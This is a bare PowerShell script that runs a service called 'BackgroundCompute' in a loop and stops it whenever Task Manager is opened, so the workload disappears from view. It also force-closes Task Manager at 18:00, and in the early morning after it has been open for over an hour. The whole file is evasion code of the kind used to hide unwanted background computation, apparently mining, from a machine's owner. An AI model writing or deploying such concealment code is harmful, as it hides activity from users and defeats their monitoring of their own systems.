$service = 'BackgroundCompute'
$opened = $null
while ($true) {
    $manager = Get-Process -Name taskmgr -ErrorAction SilentlyContinue
    $now = Get-Date
    if ($manager) {
        Stop-Service $service -Force
        if ($null -eq $opened) { $opened = $now }
        if ($now.Hour -eq 18 -or (($now.Hour -lt 6) -and (($now - $opened).TotalHours -gt 1))) {
            Stop-Process -Name taskmgr -Force
        }
    } else {
        Start-Service $service
        $opened = $null
    }
    Start-Sleep -Seconds 2
}
